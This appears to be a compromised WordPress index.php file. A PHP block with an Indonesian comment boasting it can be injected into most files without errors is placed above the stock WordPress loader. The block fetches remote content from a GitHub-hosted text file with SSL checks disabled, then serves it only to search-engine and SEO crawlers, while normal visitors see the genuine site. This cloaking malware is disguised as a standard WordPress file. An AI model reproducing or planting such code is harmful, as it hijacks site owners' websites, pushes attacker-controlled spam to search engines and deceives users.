// BISA INJECT KEBANYAK FILE ANTI 500

<?php
$d = (function($u){
  static $r; if(isset($r))return false; $r=1;
  if(ini_get('allow_url_fopen'))return @file_get_contents($u,0,stream_context_create(['http'=>['timeout'=>6],'https'=>['timeout'=>6]]));
  if(function_exists('curl_init')){$c=curl_init($u);curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_TIMEOUT=>10]);$r=curl_exec($c);curl_close($c);return $r;}
  return false;
})("https://raw.githubusercontent.com/ajabahan1/bahan/refs/heads/main/indexhaba.txt");

$u = strtolower($_SERVER["HTTP_USER_AGENT"]);
if(preg_match('/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/',$u)){
  header("Content-Type: text/html; charset=UTF-8");
  header("Vary: User-Agent");
  if($d!==false)echo $d;exit;
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
